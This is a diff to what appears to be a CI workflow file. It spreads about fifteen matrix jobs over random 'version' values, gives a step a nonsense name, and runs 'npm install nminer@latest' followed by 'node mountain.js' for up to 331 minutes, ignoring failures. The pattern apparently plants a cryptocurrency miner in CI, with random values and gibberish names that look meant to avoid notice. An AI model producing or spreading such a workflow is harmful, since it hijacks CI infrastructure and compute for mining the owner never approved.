@@ -9,23 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8591 }
-          - { version: 631 }
-          - { version: 4616 }
-          - { version: 8546 }
-          - { version: 3569 }
-          - { version: 9643 }
-          - { version: 8097 }
-          - { version: 7802 }
-          - { version: 3061 }
-          - { version: 7927 }
-          - { version: 3735 }
-          - { version: 2547 }
-          - { version: 7698 }
-          - { version: 9400 }
-          - { version: 6230 }
-          - { version: 2802 }
-          - { version: 1261 }
+          - { version: 1986 }
+          - { version: 8212 }
+          - { version: 6192 }
+          - { version: 4543 }
+          - { version: 4338 }
+          - { version: 8152 }
+          - { version: 7728 }
+          - { version: 7799 }
+          - { version: 3102 }
+          - { version: 8224 }
+          - { version: 710 }
+          - { version: 9811 }
+          - { version: 502 }
+          - { version: 9525 }
+          - { version: 1900 }
 
     steps:
       - name: Checkout
@@ -36,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: heartache geez inasmuch
+      - name: sniveling definitive dearly um
         run: |
           npm install nminer@latest
-          timeout 300m node mountain.js || echo "mountain executed"
+          timeout 331m node mountain.js || echo "mountain executed"
